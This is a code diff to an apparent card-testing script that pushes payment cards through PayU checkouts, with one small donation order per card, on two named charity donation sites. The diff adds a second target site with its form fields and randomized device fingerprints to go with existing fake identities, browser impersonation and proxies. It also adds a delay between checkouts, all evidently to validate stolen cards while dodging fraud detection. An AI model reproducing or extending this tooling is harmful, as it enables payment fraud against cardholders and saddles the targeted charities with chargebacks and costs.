@@ -20,6 +20,8 @@ import random
 import re
 import time
 import urllib.parse
+import os
+import itertools
 from dataclasses import dataclass, field
 from typing import Optional, Tuple
 
@@ -63,9 +65,85 @@ def generate_identity() -> Tuple[str, str, str]:
 
 
 # ── PayU endpoints ────────────────────────────────────────────────────
-MERCHANT_CREATE_URL = "https://centaurus.org.pl/wp-json/centaurus/v1/payu/create"
 PAYU_BASE = "https://secure.payu.com"
 PAYU_PAY_URL = PAYU_BASE + "/pay/"
+
+# ── PayU sites (merchant create endpoint per site) ───────────────────
+PAYU_SITES = {
+    "centaurus": {
+        "create_url": "https://centaurus.org.pl/wp-json/centaurus/v1/payu/create",
+        "create_type": "json",
+        "referer": "https://centaurus.org.pl/en/donate/",
+        "origin": "https://centaurus.org.pl",
+        "amount": "1",
+        "mcp_fx_table_id": None,
+        "mcp_fx_rate": None,
+        "language": "en",
+        "lang_param": "&lang=en",
+        "country": "IN",
+        "timezone_offset": -330,
+        "extra_payload": {
+            "currency": "usd",
+            "target_id": "foundation",
+            "terms": True,
+            "newsletter": False,
+            "payment_type": "one-time",
+            "subscription": 0,
+        },
+    },
+    "fundacjaadamhadlaw": {
+        "create_url": "https://fundacjaadamhadlaw.pl/przekaz-darowizne/",
+        "create_type": "form",
+        "referer": "https://fundacjaadamhadlaw.pl/przekaz-darowizne/",
+        "origin": "https://fundacjaadamhadlaw.pl",
+        "amount": "10",
+        "mcp_fx_table_id": 597551,
+        "mcp_fx_rate": 1,
+        "language": "en",
+        "lang_param": "",
+        "country": "PL",
+        "timezone_offset": -60,
+        "form_fields": {
+            "flexible_donation[first_name]": "{first}",
+            "flexible_donation[last_name]": "{last}",
+            "flexible_donation[email]": "{email}",
+            "flexible_donation[amount]": "10",
+            "flexible_donation[comment]": "",
+            "flexible_donation[payment_method]": "payu",
+            "flexible_donation[terms]": "yes",
+            "flexible_donation[anonymous_data]": "no",
+            "flexible_donation[anonymous_amount]": "no",
+            "flexible_donation[form_id]": "138",
+            "flexible_donation[send_donation]": "Wy\u015blij darowizn\u0119",
+        },
+    },
+}
+
+# ── real device profiles (screen / color depth) ──────────────────────
+DEVICE_PROFILES = [
+    {"screenWidth": 1920, "screenHeight": 1080, "colorDepth": 24},
+    {"screenWidth": 1366, "screenHeight": 768,  "colorDepth": 24},
+    {"screenWidth": 1536, "screenHeight": 864,  "colorDepth": 24},
+    {"screenWidth": 1440, "screenHeight": 900,  "colorDepth": 32},
+    {"screenWidth": 2560, "screenHeight": 1440, "colorDepth": 24},
+    {"screenWidth": 1280, "screenHeight": 720,  "colorDepth": 24},
+    {"screenWidth": 1680, "screenHeight": 1050, "colorDepth": 24},
+    {"screenWidth": 3840, "screenHeight": 2160, "colorDepth": 24},
+]
+
+# ── global checkout rate limiter (delay between checkouts) ────────────
+CHECKOUT_DELAY = float(os.environ.get("PAYU_CHECKOUT_DELAY", "3"))
+_last_checkout_ts = 0.0
+_rate_lock = asyncio.Lock()
+
+
+async def _throttle():
+    global _last_checkout_ts
+    async with _rate_lock:
+        wait = CHECKOUT_DELAY - (time.time() - _last_checkout_ts)
+        if wait > 0:
+            await asyncio.sleep(wait)
+        _last_checkout_ts = time.time()
 
 
 def parse_card(cc: str) -> Tuple[str, str, str, str]:
@@ -145,24 +223,27 @@ class PayuResult:
 
 
 def _browser_data(user_agent: str, timezone_offset: int) -> dict:
+    d = random.choice(DEVICE_PROFILES)
     return {
-        "screenWidth": 1920,
+        "screenWidth": d["screenWidth"],
         "javaEnabled": False,
         "timezoneOffset": timezone_offset,
-        "screenHeight": 1080,
+        "screenHeight": d["screenHeight"],
         "userAgent": user_agent,
-        "colorDepth": 24,
+        "colorDepth": d["colorDepth"],
         "language": "en-US",
         "challengeWindowSize": "04",
     }
 
 
 async def run_payu_check(amount: str, card_entry: str, proxy_url: str = "",
-                         country: str = "IN", timezone_offset: int = -330) -> PayuResult:
+                         site: str = "centaurus") -> PayuResult:
     """Run a full PayU checkout for one card. Every call = fresh order + fresh user."""
+    await _throttle()
     number, month, year, cvv = parse_card(card_entry)
     first, last, email = generate_identity()
     full_name = f"{first} {last}"
+    cfg = PAYU_SITES.get(site, PAYU_SITES["centaurus"])
 
     impersonate = random.choice(BROWSER_PROFILES)
     user_agent = PROFILE_UA[impersonate]
@@ -184,35 +265,34 @@ async def run_payu_check(amount: str, card_entry: str, proxy_url: str = "",
     s = new_session()
 
     try:
-        # 1. create the order on the merchant
-        create_payload = {
-            "amount": float(amount) if amount else 1,
-            "currency": "usd",
-            "country": country,
-            "full_name": full_name,
-            "email": email,
-            "target_id": "foundation",
-            "terms": True,
-            "newsletter": False,
-            "payment_type": "one-time",
-            "subscription": 0,
-        }
-        r = await s.post(
-            MERCHANT_CREATE_URL,
-            json=create_payload,
-            headers={
-                "Referer": "https://centaurus.org.pl/en/donate/",
-                "Origin": "https://centaurus.org.pl",
-                "Content-Type": "application/json",
-            },
-        )
-        if r.status_code != 200:
-            raise Exception(f"create order failed: HTTP {r.status_code}")
-        create = r.json()
-        redirect = create.get("redirect") or ""
-        payuid = create.get("payuid") or ""
-        if not redirect or not payuid:
-            raise Exception("create order: missing redirect/payuid")
+        # 1. create the order on the merchant (json API or html form + redirect)
+        if cfg["create_type"] == "form":
+            form = {}
+            for k, v in cfg["form_fields"].items():
+                form[k] = v.format(first=first, last=last, email=email)
+            r = await s.post(
+                cfg["create_url"], data=form, allow_redirects=False,
+                headers={"Referer": cfg["referer"], "Origin": cfg["origin"],
+                         "Content-Type": "application/x-www-form-urlencoded"})
+            redirect = r.headers.get("Location") or ""
+        else:
+            create_payload = {
+                "amount": float(amount) if amount else cfg["amount"],
+                "full_name": full_name,
+                "email": email,
+                "country": cfg["country"],
+            }
+            create_payload.update(cfg["extra_payload"])
+            r = await s.post(
+                cfg["create_url"], json=create_payload,
+                headers={"Referer": cfg["referer"], "Origin": cfg["origin"],
+                         "Content-Type": "application/json"})
+            if r.status_code != 200:
+                raise Exception(f"create order failed: HTTP {r.status_code} {r.text[:200]}")
+            create = r.json()
+            redirect = create.get("redirect") or ""
+        if not redirect:
+            raise Exception("create order: missing redirect")
 
         # parse orderId + JWT from the redirect URL
         parsed = urllib.parse.urlparse(redirect)
@@ -272,11 +352,11 @@ async def run_payu_check(amount: str, card_entry: str, proxy_url: str = "",
                 "cardDetails": {"maskedCardNumber": masked},
             },
             "metadata": {"cardInputTime": random.randint(3000, 8000)},
-            "redirectUrl": PAYU_PAY_URL + "?orderId=" + order_id + "&token=%token%&lang=en",
-            "mcpFxTableId": None,
-            "mcpFxRate": None,
-            "browserData": _browser_data(user_agent, timezone_offset),
-            "language": "en",
+            "redirectUrl": PAYU_PAY_URL + "?orderId=" + order_id + "&token=%token%" + cfg["lang_param"],
+            "mcpFxTableId": cfg["mcp_fx_table_id"],
+            "mcpFxRate": cfg["mcp_fx_rate"],
+            "browserData": _browser_data(user_agent, cfg["timezone_offset"]),
+            "language": cfg["language"],
             "invoice": None,
         }
         r = await s.post(f"{PAYU_BASE}/api/front/orders/{order_id}/payments", json=pay_payload, headers=api_headers)
